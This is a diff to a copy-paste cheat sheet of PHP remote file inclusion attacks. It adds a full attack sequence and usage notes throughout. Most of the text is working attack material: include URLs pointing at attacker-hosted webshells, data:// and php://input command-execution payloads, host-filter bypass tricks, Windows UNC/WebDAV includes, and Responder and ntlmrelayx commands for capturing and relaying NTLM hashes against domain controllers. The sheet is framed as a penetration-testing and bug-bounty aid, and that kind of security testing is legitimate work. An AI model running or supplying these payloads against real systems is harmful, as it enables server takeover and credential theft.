@@ -1,11 +1,48 @@
 # RFI Arsenal — Remote-Include Payloads, Suffix-Defeats & Shell-Host Snippets (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `RFI_TESTING_GUIDE.md`. Authorized testing only — **benign markers**, clean up (Guide §19).
 > RFI = your code **executes** on the target (RCE). A mere fetch is **SSRF** — prove execution (Guide §4/§15).
 
 ---
 
+## §0.0 — The whole attack in one sequence
+
+*What & when:* the entire RFI run on one screen — the **decision spine** you actually follow. RFI is not "spray payloads"; it's a short ladder gated by one config (`allow_url_include`) and one OS fact (Windows treats UNC as a local path). Prove **execution** (not fetch), and if the naïve remote include is blocked, walk the rungs *in order* — each has different prerequisites. The moment a Linux `allow_url_include=Off` box refuses every rung, it's no longer RFI: hand the same sink to the **LFI kit**.
+
+```
+# ── 1. RECON the sink (Guide §3) ──────────────────────────────────────────
+?page= / ?file= / ?template= / ?lang= / ?module= …   → any param whose value looks like a file/module name
+#   confirm it's a file-inclusion sink:  ?page=/etc/passwd  (or ?page=C:\windows\win.ini on Windows)
+
+# ── 2. PROVE FETCH (Guide §4) — this is only SSRF-grade, don't stop here ───
+?page=http://YOUR_OOB/probe.txt        → OOB hit from the TARGET's egress IP = it fetched. (fetch ≠ RFI yet)
+
+# ── 3. PROVE EXECUTION (Guide §4/§11) — THIS is RFI ───────────────────────
+host  p.txt = <?php echo "RFI-EXEC-".(7*7*7); ?>   (served as text/plain)
+?page=http://YOUR_OOB/p.txt?           → response shows "RFI-EXEC-343" (COMPUTED) = RCE. allow_url_include is ON.
+#   ? / %23 / %00 after the URL defeat a forced ".php" suffix (Guide §6)
+
+# ── 4. BLOCKED? walk the ladder IN ORDER (Guide §7–§11.1) ─────────────────
+allow_url_include ON + word-filter?  → allowlist-substring:  http://TRUSTED.YOUR_OOB/p.txt   (the TimThumb bug, §8)
+                                        scheme/case/enc:      hTTp:// · http:\\ · %68%74%74%70 · ftp:// · //YOUR_OOB/p.txt
+allow_url_include ON + no HTTP egress → data://text/plain;base64,<PD9waHA…>   ·   php://input + POST body <?php system("id");?>
+allow_url_include OFF + Windows       → ?page=\\YOUR_OOB\share\shell.php   (UNC = local path; + NetNTLM to Responder §10.1)
+                                        SMB blocked? WebDAV:  \\YOUR_OOB@80\dav\shell.php  (§10.2)
+allow_url_include OFF + Linux         → remote include is DEAD → PIVOT the SAME sink to the LFI kit (../LFI/)
+
+# ── 5. RCE proof, then STOP (Guide §12/§19) ──────────────────────────────
+p.txt = <?php system("id"); ?>   → uid=… output = complete Critical. No shell/exfil for bounty. Clean up.
+```
+
+> **Cash-out map:** execution proven → **RCE / full server compromise (Critical, CWE-98)** → read app config/`.env` → DB & cloud creds (read-only, redact) → lateral/cloud pivot (SSRF-kit discipline). Windows UNC even *without* execution → **NetNTLM capture → crack/relay**. Only a *fetch*, no execution? File it as **SSRF**, not RFI.
+
+---
+
 ## 1. Benign proof payloads to HOST (serve as text/plain)
+
+> **What & when:** these are the *recipe cards you put on your own server* for the target's chef to cook. Start with the arithmetic one every time (`echo 7*7*7`) — it's how you prove *cooking happened* vs a mere fetch. Escalate to the command card (`system`) only after cooking is confirmed, and use the callback/`sleep` cards when you can't see the output (blind). Serve all of them as **text/plain** so your own box doesn't cook them first.
 
 ```php
 # shell.txt  — execution proof (prints RFI-EXEC-343 only if PHP RAN)
@@ -23,6 +60,8 @@
 Host with: `python3 poc/payload_host.py --port 8000` (sets `Content-Type: text/plain` + logs hits).
 
 ## 2. Core remote-include payloads (Guide §5/§6)
+
+> **What & when:** the classic "mail the card from my website" set — use when `allow_url_include=On` (or you don't yet know). Try the plain URL first; the moment you see the app forcing a `.php` suffix, switch to the **`?` variant** (it swallows the appended `.php`) — that's your default and most reliable line. `%23`/`%00` are fallbacks; the scheme swaps (`https`/`ftp`) and `:80` are for when a scheme or high port is filtered. Append `&c=id` once you move to the command card.
 
 ```
 ?page=http://YOUR_IP:8000/shell.txt                 # plain (no forced suffix)
@@ -49,6 +88,8 @@ smb://YOUR_IP/share/shell.php        # smb scheme (some configs)
 
 ## 4. data:// / php://input / expect (no remote URL — Guide §9)
 
+> **What & when:** reach for these the instant `http://` is refused (`allow_url_include=Off`) — they hand the chef a card *without any website at all*, so the "no remote URLs" rule doesn't apply. `data://` writes the whole card inline in the URL; `php://input` puts it in your POST body; `expect://` runs a command directly. They need only the one vulnerable parameter (no reachable payload host), which is why they're the most common way RFI "still works" on modern PHP. Test `data://` first as your quick `allow_url_include` check.
+
 ```
 # data:// (base64 = <?php system($_GET['c']);?>)
 ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
@@ -66,6 +107,8 @@ echo -n '<?php system($_GET["c"]); ?>' | base64    # PD9waHAgc3lzdGVtKCRfR0VUWyJ
 
 ## 5. Windows UNC / SMB include (Guide §10)
 
+> **What & when:** the Windows-target path, and it **ignores `allow_url_include` entirely** (Windows treats `\\host\share` as a local file, not a URL). Use it whenever the target is Windows and `http://` RFI is blocked. Stand up a fake share (`impacket-smbserver`), drop your `shell.php` in it, and point the include at `\\YOUR_IP\share\shell.php`. Needs outbound SMB/445 (common internally; if blocked, jump to §5c WebDAV). Bonus: it also leaks the NTLM hash (§5b) even if the file never runs.
+
 ```
 # host the share (Kali/WSL):
 impacket-smbserver share ./www -smb2support          # put shell.php (PHP) in ./www
@@ -76,6 +119,7 @@ impacket-smbserver share ./www -smb2support          # put shell.php (PHP) in ./
 ```
 
 ## 5b. NTLM hash capture & relay — payoff even WITHOUT execution (Guide §10.1)
+> **What & when:** the consolation prize — use whenever a Windows UNC include *connects* but you can't confirm the file ran (or the program disputes RCE). Windows introduces itself with its account credentials the moment it touches your share, so just pointing the include at `\\YOUR_IP\x` with Responder listening captures the NetNTLMv2 hash → crack (`hashcat -m 5600`) or, on authorized red-team, relay it live (`ntlmrelayx`) to another service for exec/DCSync. Report it as an auth-coercion/SSRF finding even with zero execution.
 ```
 # the UNC fetch authenticates the target's machine/service account to YOUR server BEFORE the file runs:
 sudo responder -I eth0                                 # captures NetNTLMv2 when the include opens \\YOUR_IP\x
@@ -97,6 +141,8 @@ ntlmrelayx.py -smb2support -t ldap://<DC>              # or -t smb://<host> / -t
 
 ## 6. Allowlist / host-filter bypass (Guide §8)
 
+> **What & when:** use when the include *validates* the host (only "allowed" domains). Each line matches a specific weak check: the **open-redirect bounce** (validate an allowed host, but it redirects the fetcher to your file) is the cleanest and works whenever the fetcher follows redirects; the subdomain/`contains`/`@` tricks match "startsWith"/"contains"/prefix checks respectively. These reuse the SSRF kit's parser-confusion set — stack them with the `?` suffix-defeat from §2.
+
 ```
 ?page=https://allowed.com/redirect?url=http://YOUR_IP/shell.txt?     # open redirect on allowed host (server follows)
 ?page=http://allowed.com.YOUR_DOMAIN/shell.txt?                       # "startsWith allowed" (you own *.YOUR_DOMAIN)
@@ -105,6 +151,8 @@ ntlmrelayx.py -smb2support -t ldap://<DC>              # or -t smb://<host> / -t
 ```
 
 ## 7. RCE → shell (authorized engagements only — Guide §11)
+
+> **What & when:** the commands you feed the cooked card once execution is confirmed. For **bug bounty, stop at the top three** — a single `id`/`whoami`/`hostname` output *is* the Critical proof; you don't need (and shouldn't drop) a reverse shell. The reverse-shell line is for **explicitly authorized red-team** only, and you clean it up afterward.
 
 ```
 &c=id                                  # benign proof (use first)
